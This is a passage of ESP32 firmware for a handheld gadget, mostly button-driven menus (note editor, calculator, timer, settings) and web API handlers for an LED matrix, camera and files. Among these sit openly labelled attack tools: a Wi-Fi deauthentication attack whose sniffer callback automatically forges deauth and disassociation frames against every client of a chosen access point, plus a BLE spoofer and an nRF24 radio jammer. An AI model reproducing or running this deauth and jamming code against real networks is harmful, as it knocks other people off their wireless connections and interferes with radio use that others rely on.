    if (btnDown.pressEvent && fileViewerScrollLines + visibleLines < fileViewerLineCount) { fileViewerScrollLines++; uiPlayMoveTone(); uiMarkDirty(); }
    if (okShortClick()) {
      uiPlayOkTone();
      uiEnter(UI_FILE_ACTION);
      return;
    }
  } else if (uiScreen == UI_NOTE_EDITOR_MENU) {
    if (btnUp.pressEvent) { noteEditorMenuIndex = (noteEditorMenuIndex == 0) ? 2 : (noteEditorMenuIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { noteEditorMenuIndex = (noteEditorMenuIndex + 1) % 3; uiPlayMoveTone(); uiMarkDirty(); }
    if (okShortClick()) {
      uiPlayOkTone();
      if (noteEditorMenuIndex == 0) {
        uiEnter(UI_NOTE_EDITOR_MAIN);
      } else if (noteEditorMenuIndex == 1) {
        textKeyboardBuffer = "default";
        textKeyboardTarget = TEXT_TARGET_NOTE_LOAD;
        textKeyboardMode = WIFI_KEYS_ALPHA;
        textKeyboardShift = false;
        textKeyboardRow = 0; textKeyboardCol = 0;
        textKeyboardUpLatched = false; textKeyboardDownLatched = false;
        uiEnter(UI_MATRIX_TEXT_KEYBOARD);
      } else {
        uiEnter(UI_TOOLS_MENU);
      }
      return;
    }
  } else if (uiScreen == UI_NOTE_EDITOR_MAIN) {
    if (btnUp.pressEvent) { noteEditorMenuIndex = (noteEditorMenuIndex == 0) ? 9 : (noteEditorMenuIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { noteEditorMenuIndex = (noteEditorMenuIndex + 1) % 10; uiPlayMoveTone(); uiMarkDirty(); }
    if (okShortClick()) {
      uiPlayOkTone();
      if (noteEditorMenuIndex == 0) {
        if (noteStepCount > 0) {
          noteCursor = (noteCursor + 1) % noteStepCount;
          noteSyncPickerFromCursor();
        }
      } else if (noteEditorMenuIndex == 1) {
        notePitchIndex = (notePitchIndex + 1) % notePitchCount;
        if (notePitchTable[notePitchIndex].freq > 0) buzzerTone(notePitchTable[notePitchIndex].freq, 90);
        else buzzerNoTone();
      } else if (noteEditorMenuIndex == 2) {
        noteDurIndex = (noteDurIndex + 1) % noteDurCount;
      } else if (noteEditorMenuIndex == 3) {
        if (noteStepCount < NOTE_MAX_STEPS) {
          noteSteps[noteStepCount].freq = notePitchTable[notePitchIndex].freq;
          noteSteps[noteStepCount].durMs = noteDurTable[noteDurIndex];
          noteCursor = noteStepCount;
          noteStepCount++;
        }
      } else if (noteEditorMenuIndex == 4) {
        if (noteStepCount > 0) {
          noteSteps[noteCursor].freq = notePitchTable[notePitchIndex].freq;
          noteSteps[noteCursor].durMs = noteDurTable[noteDurIndex];
        }
      } else if (noteEditorMenuIndex == 5) {
        if (noteStepCount > 0) {
          for (uint8_t i = noteCursor; i + 1 < noteStepCount; i++) noteSteps[i] = noteSteps[i + 1];
          noteStepCount--;
          if (noteCursor >= noteStepCount && noteStepCount > 0) noteCursor = noteStepCount - 1;
          if (noteStepCount == 0) noteCursor = 0;
          noteSyncPickerFromCursor();
        }
      } else if (noteEditorMenuIndex == 6) {
        if (notePlaying) noteStopPlay();
        else noteStartPlay();
      } else if (noteEditorMenuIndex == 7) {
        textKeyboardBuffer = noteLoadedName;
        textKeyboardTarget = TEXT_TARGET_NOTE_SAVE;
        textKeyboardMode = WIFI_KEYS_ALPHA;
        textKeyboardShift = false;
        textKeyboardRow = 0; textKeyboardCol = 0;
        textKeyboardUpLatched = false; textKeyboardDownLatched = false;
        uiEnter(UI_MATRIX_TEXT_KEYBOARD);
        return;
      } else if (noteEditorMenuIndex == 8) {
        textKeyboardBuffer = noteLoadedName;
        textKeyboardTarget = TEXT_TARGET_NOTE_LOAD;
        textKeyboardMode = WIFI_KEYS_ALPHA;
        textKeyboardShift = false;
        textKeyboardRow = 0; textKeyboardCol = 0;
        textKeyboardUpLatched = false; textKeyboardDownLatched = false;
        uiEnter(UI_MATRIX_TEXT_KEYBOARD);
        return;
      } else if (noteEditorMenuIndex == 9) {
        noteStopPlay();
        noteStepCount = 0;
        noteCursor = 0;
      }
      uiMarkDirty();
      return;
    }
  } else if (uiScreen == UI_DEAUTH_SCANNER) {
    uint8_t itemCount = wifiScanCount + 1;
    if (btnUp.pressEvent) { wifiListIndex = (wifiListIndex == 0) ? (itemCount - 1) : (wifiListIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { wifiListIndex = (wifiListIndex + 1) % itemCount; uiPlayMoveTone(); uiMarkDirty(); }
    if (okShortClick()) {
      uiPlayOkTone();
      if (wifiListIndex >= wifiScanCount) {
        startDeauthScan();
        return;
      }
      deauthTargetSsid = wifiScanSsids[wifiListIndex];
      deauthTargetChannel = deauthScanChannels[wifiListIndex];
      memcpy(deauthTargetBssid, deauthScanBssids[wifiListIndex], 6);
      reasonListIndex = 1; // Default to "1: Unspecified"
      selectedReason = deauthReasonList[reasonListIndex].code;
      uiEnter(UI_DEAUTH_REASON_PICKER);
    }
  } 
  else if (uiScreen == UI_DEAUTH_REASON_PICKER) {
    if (btnUp.pressEvent) { 
      reasonListIndex = (reasonListIndex == 0) ? (deauthReasonCount - 1) : (reasonListIndex - 1);
      uiPlayMoveTone(); 
      uiMarkDirty(); 
    }
    if (btnDown.pressEvent) { 
      reasonListIndex = (reasonListIndex + 1) % deauthReasonCount;
      uiPlayMoveTone(); 
      uiMarkDirty(); 
    }
    if (okShortClick()) {
      selectedReason = deauthReasonList[reasonListIndex].code;
      uiPlayOkTone();
      WiFi.mode(WIFI_STA);
      WiFi.disconnect(true);
      wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
      esp_wifi_set_promiscuous_filter(&filt);
      esp_wifi_set_promiscuous(true); // Promiscuous mode to allow arbitrary injection and channel changes
      esp_wifi_set_promiscuous_rx_cb(&deauthSniffer);
      esp_wifi_set_channel(deauthTargetChannel, WIFI_SECOND_CHAN_NONE);
      deauthKilling = true;
      deauthPacketsSent = 0;
      lastDeauthSentMs = millis();
      uiEnter(UI_DEAUTH_ATTACK);
    }
  } else if (uiScreen == UI_DEAUTH_ATTACK) {
    if (okShortClick() || okLongPress()) {
      uiPlayOkTone();
      deauthKilling = false;
      esp_wifi_set_promiscuous_rx_cb(NULL);
      esp_wifi_set_promiscuous(false);
      WiFi.disconnect(false, false);
      WiFi.mode(WIFI_OFF);
      uiEnter(UI_TOOLS_MENU);
    }
  } else if (uiScreen == UI_BLE_SPOOFER) {
    if (btnUp.pressEvent) { bleSpoofIndex = (bleSpoofIndex == 0) ? (bleSpoofCount - 1) : (bleSpoofIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { bleSpoofIndex = (bleSpoofIndex + 1) % bleSpoofCount; uiPlayMoveTone(); uiMarkDirty(); }
    if (okShortClick()) { uiPlayOkTone(); toggleBleSpoofer(); }
  
  } else if (uiScreen == UI_BLE_SCANNER) {
    uint8_t itemCount = bleDevCount + 1;
    if (btnUp.pressEvent) { bleListIndex = (bleListIndex == 0) ? (itemCount - 1) : (bleListIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { bleListIndex = (bleListIndex + 1) % itemCount; uiPlayMoveTone(); uiMarkDirty(); }
    if (okShortClick() && bleListIndex == bleDevCount) {
      uiPlayOkTone();
      triggerBleScan(true);
    }
  } else if (uiScreen == UI_RF_JAMMER) {
    if (btnUp.pressEvent || btnDown.pressEvent) { 
      nrfJamMode = (nrfJamMode + 1) % 3; 
      uiPlayMoveTone(); 
      uiMarkDirty(); 
    }
    if (okShortClick()) {
      uiPlayOkTone();
      if (nrfRadioFound) {
        nrfJammingActive = !nrfJammingActive;
#if HAS_RF24_LIB
        if (!nrfJammingActive) {
          nrfRadio.stopConstCarrier();
          nrfRadio.powerDown();
          nrfRadio.powerUp();
        }
#endif
      }
      uiMarkDirty();
    }
  } else if (uiScreen == UI_TOOL_CALC) {
    if (btnUp.pressEvent) {
      calcAdjustValue(+1);
      calcRepeatUpMs = millis();
      uiPlayMoveTone();
      uiMarkDirty();
    }
    if (btnDown.pressEvent) {
      calcAdjustValue(-1);
      calcRepeatDownMs = millis();
      uiPlayMoveTone();
      uiMarkDirty();
    }
    if (btnUp.stable && btnUp.longFired && millis() - calcRepeatUpMs >= 90) {
      calcAdjustValue(+1);
      calcRepeatUpMs = millis();
      uiMarkDirty();
    }
    if (btnDown.stable && btnDown.longFired && millis() - calcRepeatDownMs >= 90) {
      calcAdjustValue(-1);
      calcRepeatDownMs = millis();
      uiMarkDirty();
    }
    if (okShortClick()) {
      uiPlayOkTone();
      calcState.field = (calcState.field + 1) % 3;
      uiMarkDirty();
    }
  } else if (uiScreen == UI_TOOL_STOPWATCH) {
    if (btnUp.pressEvent) {
      stopwatchState.running = false;
      stopwatchState.accumulatedMs = 0;
      stopwatchState.startedMs = 0;
      uiPlayMoveTone();
      uiMarkDirty();
    }
    if (okShortClick()) {
      uiPlayOkTone();
      if (!stopwatchState.running) {
        stopwatchState.running = true;
        stopwatchState.startedMs = millis();
      } else {
        stopwatchState.accumulatedMs += millis() - stopwatchState.startedMs;
        stopwatchState.running = false;
      }
      uiMarkDirty();
    }
  } else if (uiScreen == UI_TOOL_TIMER) {
    if (btnUp.pressEvent) {
      if (!timerState.running) {
        timerState.setSeconds = min<uint16_t>(3599, timerState.setSeconds + 5);
        timerState.remainingSeconds = timerState.setSeconds;
      } else {
        timerState.running = false;
        timerState.finished = false;
        timerState.remainingSeconds = timerState.setSeconds;
      }
      uiPlayMoveTone();
      uiMarkDirty();
    }
    if (btnDown.pressEvent && !timerState.running) {
      timerState.setSeconds = max<uint16_t>(5, timerState.setSeconds - 5);
      timerState.remainingSeconds = timerState.setSeconds;
      timerState.finished = false;
      uiPlayMoveTone();
      uiMarkDirty();
    }
    if (okShortClick()) {
      uiPlayOkTone();
      if (!timerState.running) {
        timerState.finished = false;
        timerState.remainingSeconds = max<uint16_t>(1, timerState.remainingSeconds);
        timerState.lastTickMs = millis();
        timerState.running = true;
      } else timerState.running = false;
      uiMarkDirty();
    }
  } else if (uiScreen == UI_TOOL_LAMP) {
    if (okShortClick()) {
      uiPlayOkTone();
      lampSetEnabled(!lampOn);
      uiMarkDirty();
    }
    } else if (uiScreen == UI_SET_TFT_BL) {
    static uint32_t repUpMs = 0, repDnMs = 0;
    if (btnUp.pressEvent) { uiEditValue = constrain(uiEditValue + 5, 0, 255); uiPlayMoveTone(); uiMarkDirty(); repUpMs = millis(); }
    if (btnDown.pressEvent) { uiEditValue = constrain(uiEditValue - 5, 0, 255); uiPlayMoveTone(); uiMarkDirty(); repDnMs = millis(); }
    if (btnUp.stable && btnUp.longFired && millis() - repUpMs >= 60) { uiEditValue = constrain(uiEditValue + 1, 0, 255); repUpMs = millis(); uiMarkDirty(); }
    if (btnDown.stable && btnDown.longFired && millis() - repDnMs >= 60) { uiEditValue = constrain(uiEditValue - 1, 0, 255); repDnMs = millis(); uiMarkDirty(); }
    if (okShortClick()) { uiPlayOkTone(); blSet((uint8_t)uiEditValue); (void)blSaveToFS(); uiEnter(UI_SETTINGS_MENU); }
    } else if (uiScreen == UI_SET_MATRIX_BR) {
    static uint32_t repUpMs = 0, repDnMs = 0;
    if (btnUp.pressEvent) { uiEditValue = constrain(uiEditValue + 5, 0, 255); uiPlayMoveTone(); uiMarkDirty(); repUpMs = millis(); }
    if (btnDown.pressEvent) { uiEditValue = constrain(uiEditValue - 5, 0, 255); uiPlayMoveTone(); uiMarkDirty(); repDnMs = millis(); }
    if (btnUp.stable && btnUp.longFired && millis() - repUpMs >= 60) { uiEditValue = constrain(uiEditValue + 1, 0, 255); repUpMs = millis(); uiMarkDirty();  }
    if (btnDown.stable && btnDown.longFired && millis() - repDnMs >= 60) { uiEditValue = constrain(uiEditValue - 1, 0, 255); repDnMs = millis(); uiMarkDirty(); }
    if (okShortClick()) { uiPlayOkTone(); gBrightness = (uint8_t)uiEditValue; brightnessDirty = true; applyBrightnessIfDirty(); (void)brightnessSaveToFS(); uiEnter(UI_SETTINGS_MENU); matrixIdleDirty = true; matrixDirty = true; }
    } else if (uiScreen == UI_SET_UTC_OFFSET) {
    if (btnUp.pressEvent) { uiOffsetIdx = utcOffsetNextIndex(uiOffsetIdx, +1); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { uiOffsetIdx = utcOffsetNextIndex(uiOffsetIdx, -1); uiPlayMoveTone(); uiMarkDirty(); }
    if (okShortClick()) { uiPlayOkTone(); gUtcOffsetMinutes = (int)kUtcOffsetsMin[uiOffsetIdx]; timeApplyTZ(); timeSynced = false; (void)utcOffsetSaveToFS(); uiEnter(UI_SETTINGS_MENU); }
  }
  if (!tftSleeping && uiDirty) {
    uiDirty = false;
    if (uiScreen == UI_MENU) tftDrawIconMenu();
    else if (uiScreen == UI_MEDIA_MENU) tftDrawMediaMenu();
    else if (uiScreen == UI_SETTINGS_MENU) tftDrawSettingsMenu();
    else if (uiScreen == UI_WIFI_LIST) tftDrawWifiListMenu();
    else if (uiScreen == UI_WIFI_KEYBOARD) tftDrawWifiKeyboard();
    else if (uiScreen == UI_SONG_MENU) tftDrawSongMenu();
    else if (uiScreen == UI_TOOLS_MENU) tftDrawToolsMenu();
    else if (uiScreen == UI_DEAUTH_SCANNER) tftDrawDeauthScanner();
    else if (uiScreen == UI_FILE_EXPLORER) tftDrawFileExplorer();
    else if (uiScreen == UI_FILE_ACTION) tftDrawFileAction();
    else if (uiScreen == UI_FILE_VIEWER) tftDrawFileViewer();
    else if (uiScreen == UI_MATRIX_TEXT_MENU) tftDrawMatrixTextMenu();
    else if (uiScreen == UI_MATRIX_TEXT_KEYBOARD) tftDrawTextKeyboard();
    else if (uiScreen == UI_NOTE_EDITOR_MENU) tftDrawNoteEditorMenu();
    else if (uiScreen == UI_NOTE_EDITOR_MAIN) tftDrawNoteEditorMain();
    else if (uiScreen == UI_DEAUTH_REASON_PICKER) tftDrawReasonPicker();
    else if (uiScreen == UI_DEAUTH_ATTACK) tftDrawDeauthAttack();
    else if (uiScreen == UI_TOOL_CALC) tftDrawCalcTool();
    else if (uiScreen == UI_TOOL_STOPWATCH) tftDrawStopwatchTool();
    else if (uiScreen == UI_TOOL_TIMER) tftDrawTimerTool();
    else if (uiScreen == UI_TOOL_LAMP) tftDrawLampTool();
    else if (uiScreen == UI_SET_TFT_BL) tftDrawValueScreen("TFT Backlight", String(uiEditValue), uiEditValue, 0, 255);
    else if (uiScreen == UI_SET_MATRIX_BR) tftDrawValueScreen("LED Brightness", String(uiEditValue), uiEditValue, 0, 255);
    else if (uiScreen == UI_SET_UTC_OFFSET) tftDrawUtcScreen();
    else if (uiScreen == UI_BLE_SPOOFER) tftDrawBleSpoofer();
    else if (uiScreen == UI_BLE_SCANNER) tftDrawBleList("BLE Monitor");
    else if (uiScreen == UI_RF_JAMMER) tftDrawRfJammer();
    else if (uiScreen == UI_TOOL_CALC) tftDrawCalcTool();
  }
}

static void wifiAutoConfig() {
  WiFi.mode(WIFI_STA);
  (void)wifiCredentialsLoadFromFS();
  WiFi.persistent(true);
  WiFi.setAutoReconnect(true);
  wifiLimitedMode = true;
  if (savedWifiSsid.length() == 0) {
    WiFiManager wm;
    wm.setConfigPortalTimeout(180);
    wm.setConfigPortalBlocking(false);
    wm.setAPCallback([](WiFiManager *mgr) {
      String ap = mgr ? mgr->getConfigPortalSSID() : String("Ripa-Setup");
      tftDrawWifiConfigHelp(ap.c_str());
    });
    wm.startConfigPortal("Ripa-Setup");
    uint32_t startPortalMs = millis();
    tftDrawWifiConfigHelp("Ripa-Setup");
    while (millis() - startPortalMs < 180000) {
      wm.process();
      btnUpdate(btnOk);
      if (WiFi.isConnected()) {
        wifiLimitedMode = false;
        (void)wifiCredentialsSaveToFS(WiFi.SSID(), WiFi.psk());
        btnOk.pressEvent = false;
        btnOk.releaseEvent = false;
        return;
      }
      if (okShortClick() || okLongPress()) {
        wm.stopConfigPortal();
        WiFi.disconnect(false, false);
        WiFi.mode(WIFI_OFF);
        btnOk.pressEvent = false;
        btnOk.releaseEvent = false;
        return;
      }
      delay(20);
    }
    tftDrawWifiConfigFailed();
    delay(900);
    wm.stopConfigPortal();
    WiFi.disconnect(false, false);
    WiFi.mode(WIFI_OFF);
    return;
  }

  if (savedWifiSsid.length() > 0) {
    if (savedWifiPass.length() > 0) WiFi.begin(savedWifiSsid.c_str(), savedWifiPass.c_str());
    else WiFi.begin(savedWifiSsid.c_str());
  }
  uint32_t connectWaitMs = savedWifiSsid.length() > 0 ? 4500 : 300;
  uint32_t startMs = millis();
  while (millis() - startMs < connectWaitMs) {
    if (WiFi.isConnected()) {
      wifiLimitedMode = false;
      return;
    }
    delay(80);
  }
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
}

static void wifiAutoConnectTick() {
  if (!wifiAutoConnectPending) return;
  if (deauthKilling || bleSessionActive) return;
  if (!wifiAutoConnectActive) {
    if (savedWifiSsid.length() == 0) {
      wifiAutoConnectPending = false;
      return;
    }
    WiFi.mode(WIFI_STA);
    WiFi.persistent(true);
    WiFi.setAutoReconnect(true);
    if (savedWifiPass.length() > 0) WiFi.begin(savedWifiSsid.c_str(), savedWifiPass.c_str());
    else WiFi.begin(savedWifiSsid.c_str());
    wifiAutoConnectActive = true;
    wifiAutoConnectStartMs = millis();
    return;
  }
  if (WiFi.isConnected()) {
    wifiLimitedMode = false;
    wifiAutoConnectPending = false;
    wifiAutoConnectActive = false;
    return;
  }
  if (millis() - wifiAutoConnectStartMs >= WIFI_AUTO_CONNECT_TIMEOUT_MS) {
    WiFi.disconnect(false, false);
    WiFi.mode(WIFI_OFF);
    wifiLimitedMode = true;
    wifiAutoConnectPending = false;
    wifiAutoConnectActive = false;
  }
}

static void handleStatus() {
  float rollDeg = 0, pitchDeg = 0;
  const char *dir = "FLAT";
  if (imuOn) { computeTiltDeg(rollDeg, pitchDeg); dir = computeDirection(rollDeg, pitchDeg); }
  String json = "{";
  json += "\"ip\":\"" + WiFi.localIP().toString() + "\",";
  json += "\"ssid\":\"" + jsonEscape(WiFi.SSID()) + "\",";
  json += "\"mode\":\"" + String(appMode == APP_UI ? "ui" : (appMode == APP_VIEW_BMP ? "image" : (appMode == APP_VIEW_GIF ? "gif" : (appMode == APP_CAMERA ? "cam" : "game")))) + "\",";
  json += "\"tftSleeping\":" + String(tftSleeping ? "true" : "false") + ",";
  json += "\"tftBacklight\":" + String(gTftBacklight) + ",";
  json += "\"gif\":{\"playing\":" + String(gifPlaying ? "true" : "false") + "},";
  json += "\"songPlaying\":" + String(songPlaying ? "true" : "false") + ",";
  json += "\"waterMode\":" + String(waterMode ? "true" : "false") + ",";
  json += "\"brightness\":" + String(gBrightness) + ",";
  json += "\"gyro\":{\"x\":" + String(Gyro.x, 2) + ",\"y\":" + String(Gyro.y, 2) + ",\"z\":" + String(Gyro.z, 2) + "},";
  json += "\"accel\":{\"x\":" + String(Accel.x, 3) + ",\"y\":" + String(Accel.y, 3) + ",\"z\":" + String(Accel.z, 3) + "},";
  json += "\"tilt\":{\"roll\":" + String(rollDeg, 1) + ",\"pitch\":" + String(pitchDeg, 1) + "},";
  json += "\"dir\":\"" + String(dir) + "\",";
  json += "\"gameView\":\"" + String(gameView == GAME_VIEW_MENU ? "menu" : (gameView == GAME_VIEW_SHOOTER ? "shooter" : (gameView == GAME_VIEW_TETRIS ? "tetris" : (gameView == GAME_VIEW_PONG ? "pong" : "water")))) + "\",";
  json += "\"level\":" + String(game.level) + ",";
  json += "\"score\":" + String(game.score) + ",";
  json += "\"hp\":" + String(game.hp) + ",";
  json += "\"cam\":{";
  json += "\"connected\":" + String(cameraStreamReady ? "true" : "false") + ",";
  json += "\"url\":\"" + jsonEscape(cameraUrl) + "\",";
  json += "\"lastError\":\"" + jsonEscape(cameraLastError) + "\"";
  json += "}";
  json += "}";
  server.send(200, "application/json", json);
}

static void handleModeApi() {
  if (!server.hasArg("set")) { server.send(400, "text/plain", "?set"); return; }
  String s = server.arg("set");
  if (s == "ui") exitToUi();
  else if (s == "image") enterMode(APP_VIEW_BMP);
  else if (s == "gif") enterMode(APP_VIEW_GIF);
  else if (s == "cam") enterMode(APP_CAMERA);
  else if (s == "game") gameEnterMenu();
  else { server.send(400, "text/plain", "bad"); return; }
  server.send(200, "text/plain", "OK");
}

static void handleGameApi() {
  if (!server.hasArg("set")) { server.send(400, "text/plain", "?set"); return; }
  String set = server.arg("set");
  if (set == "on") { gameEnterMenu(); server.send(200, "text/plain", "OK"); }
  else if (set == "off") { gameStop(true); server.send(200, "text/plain", "OK"); }
  else server.send(400, "text/plain", "bad");
}

static void handleMatrixGetApi() { server.send(200, "text/plain", matrixToHex384()); }

static void handleMatrixSetApi() {
  if (!server.hasArg("hex")) { server.send(400, "text/plain", "?hex"); return; }
  if (waterMode || appMode == APP_GAME) { server.send(409, "text/plain", "MATRIX_LOCKED"); return; }
  bool ok = matrixFromHex384(server.arg("hex"));
  if (ok) (void)matrixSaveToFS();
  server.send(ok ? 200 : 400, "text/plain", ok ? "OK" : "bad hex");
}

static void handleMatrixTemplateApi() {
  if (!server.hasArg("name")) { server.send(400, "text/plain", "?name"); return; }
  if (waterMode || appMode == APP_GAME) { server.send(409, "text/plain", "MATRIX_LOCKED"); return; }
  matrixApplyTemplate(parseTemplate(server.arg("name")));
  (void)matrixSaveToFS();
  server.send(200, "text/plain", "OK");
}

static void handleMatrixSaveApi() {
  if (waterMode || appMode == APP_GAME) { server.send(409, "text/plain", "MATRIX_LOCKED"); return; }
  bool ok = matrixSaveToFS();
  server.send(ok ? 200 : 500, "text/plain", ok ? "OK" : "FAIL");
}

static void handleMatrixLoadApi() {
  if (waterMode || appMode == APP_GAME) { server.send(409, "text/plain", "MATRIX_LOCKED"); return; }
  bool ok = matrixLoadFromFS();
  server.send(ok ? 200 : 404, "text/plain", ok ? "OK" : "NO_SAVED");
}

static void handleBrushApi() {
  if (!server.hasArg("rgb")) { server.send(400, "text/plain", "?rgb"); return; }
  String s = server.arg("rgb");
  int p1 = s.indexOf(',');
  int p2 = s.indexOf(',', p1 + 1);
  if (p1 < 0 || p2 < 0) { server.send(400, "text/plain", "bad rgb"); return; }
  RGB_Data[0] = (uint8_t)constrain(s.substring(0, p1).toInt(), 0, 255);
  RGB_Data[1] = (uint8_t)constrain(s.substring(p1 + 1, p2).toInt(), 0, 255);
  RGB_Data[2] = (uint8_t)constrain(s.substring(p2 + 1).toInt(), 0, 255);
  server.send(200, "text/plain", "OK");
}

static void handleBrightnessApi() {
  if (!server.hasArg("set")) { server.send(400, "text/plain", "?set"); return; }
  gBrightness = (uint8_t)constrain(server.arg("set").toInt(), 0, 255);
  brightnessDirty = true;
  applyBrightnessIfDirty();
  (void)brightnessSaveToFS();
  matrixDirty = true;
  matrixIdleDirty = true;
  uiMarkDirty();
  server.send(200, "text/plain", "OK");
}

static void handleBacklightApi() {
  if (!server.hasArg("set")) { server.send(400, "text/plain", "?set"); return; }
  blSet((uint8_t)constrain(server.arg("set").toInt(), 0, 255));
  (void)blSaveToFS();
  uiMarkDirty();
  server.send(200, "text/plain", "OK");
}

static void handleTftSleepApi() { tftEnterSleep(); server.send(200, "text/plain", "OK"); }
static void handleTftWakeApi() { tftExitSleep(); server.send(200, "text/plain", "OK"); }

static void handleImuApi() {
  if (!server.hasArg("set")) { server.send(400, "text/plain", "?set"); return; }
  String set = server.arg("set");
  if (set == "on") {
    QMI8658_SetEnabled(true);
    (void)imuSaveToFS();
    uiMarkDirty();
    server.send(200, "text/plain", "OK");
  } else if (set == "off") {
    if (appMode == APP_GAME) gameStop(true);
    QMI8658_SetEnabled(false);
    (void)imuSaveToFS();
    uiMarkDirty();
    server.send(200, "text/plain", "OK");
  } else server.send(400, "text/plain", "bad");
}

static void handleSongPlayApi() {
  if (server.hasArg("id")) {
    int id = constrain(server.arg("id").toInt(), 0, (int)SONG_ID_COUNT - 1);
    songStartSelected((SongId)id);
  } else songStart();
  uiMarkDirty();
  server.send(200, "text/plain", "OK");
}
static void handleSongStopApi() { songStop(); uiMarkDirty(); server.send(200, "text/plain", "OK"); }

static void handleWaterApi() {
  if (!server.hasArg("set")) { server.send(400, "text/plain", "?set"); return; }
  String set = server.arg("set");
  if (set == "on") {
    if (appMode == APP_GAME) gameStop(true);
    if (!imuOn) QMI8658_SetEnabled(true);
    if (!matrixSceneBackupValid) matrixCaptureScene();
    waterMode = true;
    gameView = GAME_VIEW_WATER;
    waterReset();
    uiMarkDirty();
    server.send(200, "text/plain", "OK");
  } else if (set == "off") {
    waterMode = false;
    matrixRestoreScene();
    matrixSceneBackupValid = false;
    uiMarkDirty();
    server.send(200, "text/plain", "OK");
  } else server.send(400, "text/plain", "bad");
}

static void handleCameraUrlApi() {
  if (server.hasArg("set")) {
    cameraUrl = server.arg("set");
    cameraUrl.trim();
    if (cameraUrl.length() == 0) {
      server.send(400, "text/plain", "empty");
      return;
    }
    (void)cameraUrlSaveToFS();
    cameraStop();
    server.send(200, "text/plain", "OK");
    return;
  }
  server.send(200, "text/plain", cameraUrl);
}

static void handleCameraCaptureApi() {
  if (appMode != APP_CAMERA) {
    server.send(409, "text/plain", "NOT_IN_CAMERA_MODE");
    return;
  }
  cameraCaptureRequest();
  server.send(200, "text/plain", "OK");
}

static void handleFilesApi() {
  if (!fsReady) { server.send(500, "application/json", "[]"); return; }
  String json = "[";
  bool first = true;
  File root = LittleFS.open("/");
  if (root && root.isDirectory()) {
    root.rewindDirectory();
    File file = root.openNextFile();
    while (file) {
      if (!file.isDirectory()) {
        String name = String(file.name());
        String lower = name;
        lower.toLowerCase();
        if (lower.endsWith(".jpg") || lower.endsWith(".jpeg") || lower.endsWith(".bmp") || lower.endsWith(".gif")) {
          if (!first) json += ",";
          json += "\"" + name + "\"";
          first = false;
        }
      }
      file = root.openNextFile();
    }
  }
  json += "]";
  server.send(200, "application/json", json);
}

static void handleFileServe() {
  if (!server.hasArg("path")) { server.send(400, "text/plain", "missing path"); return; }
  String path = server.arg("path");
  if (!path.startsWith("/")) path = "/" + path;
  if (!LittleFS.exists(path)) { server.send(404, "text/plain", "not found"); return; }
  File f = LittleFS.open(path, "r");
  if (!f) { server.send(500, "text/plain", "open failed"); return; }
  String lower = path; lower.toLowerCase();
  String ct = "application/octet-stream";
  if (lower.endsWith(".jpg") || lower.endsWith(".jpeg")) ct = "image/jpeg";
  else if (lower.endsWith(".bmp")) ct = "image/bmp";
  else if (lower.endsWith(".gif")) ct = "image/gif";
  else if (lower.endsWith(".png")) ct = "image/png";
  server.streamFile(f, ct);
  f.close();
}


typedef struct {
  uint8_t frame_control[2] = { 0xC0, 0x00 };
  uint8_t duration[2] = { 0x00, 0x00 };
  uint8_t station[6];
  uint8_t sender[6];
  uint8_t access_point[6];
  uint8_t fragment_sequence[2] = { 0xF0, 0xFF };
  uint16_t reason;
} deauth_frame_t;

typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint16_t sequence_ctrl;
  uint8_t addr4[6];
} mac_hdr_t;

typedef struct {
  mac_hdr_t hdr;
  uint8_t payload[0];
} wifi_packet_t;

void performDeauth(uint8_t* targetMac, uint8_t* apMac) {
    deauth_frame_t frame_deauth;
    frame_deauth.reason = selectedReason;

    // Alamat ke target
    memcpy(frame_deauth.station, targetMac, 6);
    memcpy(frame_deauth.sender, apMac, 6);
    memcpy(frame_deauth.access_point, apMac, 6);
    
    // Kirim Deauth (0xC0, 0x00) (AP -> STA)
    frame_deauth.frame_control[0] = 0xC0;
    esp_wifi_80211_tx(WIFI_IF_STA, &frame_deauth, sizeof(deauth_frame_t), false);
    
    // Kirim Disassociation (0xA0, 0x00) (AP -> STA)
    frame_deauth.frame_control[0] = 0xA0;
    esp_wifi_80211_tx(WIFI_IF_STA, &frame_deauth, sizeof(deauth_frame_t), false);

    if (targetMac[0] != 0xFF) {
        // Balikin dari Target ke AP (STA -> AP)
        memcpy(frame_deauth.station, apMac, 6);
        memcpy(frame_deauth.sender, targetMac, 6);
        memcpy(frame_deauth.access_point, apMac, 6);

        frame_deauth.frame_control[0] = 0xC0;
        esp_wifi_80211_tx(WIFI_IF_STA, &frame_deauth, sizeof(deauth_frame_t), false);

        frame_deauth.frame_control[0] = 0xA0;
        esp_wifi_80211_tx(WIFI_IF_STA, &frame_deauth, sizeof(deauth_frame_t), false);
    }
}

IRAM_ATTR void deauthSniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!deauthKilling) return;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    
    if (pkt->rx_ctrl.sig_len < sizeof(mac_hdr_t)) return;

    wifi_packet_t* packet = (wifi_packet_t*)pkt->payload;
    mac_hdr_t* hdr = &packet->hdr;
    
    if (memcmp(hdr->bssid, deauthTargetBssid, 6) == 0 || memcmp(hdr->dest, deauthTargetBssid, 6) == 0 || memcmp(hdr->src, deauthTargetBssid, 6) == 0) {
        if (hdr->src[0] != 0xFF && memcmp(hdr->src, deauthTargetBssid, 6) != 0) {
            uint8_t mac[6];
            memcpy(mac, hdr->src, 6);
            performDeauth(mac, deauthTargetBssid);
            deauthPacketsSent += 4;
        }
        if (hdr->dest[0] != 0xFF && memcmp(hdr->dest, deauthTargetBssid, 6) != 0) {
            uint8_t mac[6];
            memcpy(mac, hdr->dest, 6);
            performDeauth(mac, deauthTargetBssid);
            deauthPacketsSent += 4;
        }
    }
}

static void handleUploadStream() {
  HTTPUpload &up = server.upload();
  if (up.status == UPLOAD_FILE_START) {
    uploadRejected = false;
    uploadBytes = 0;
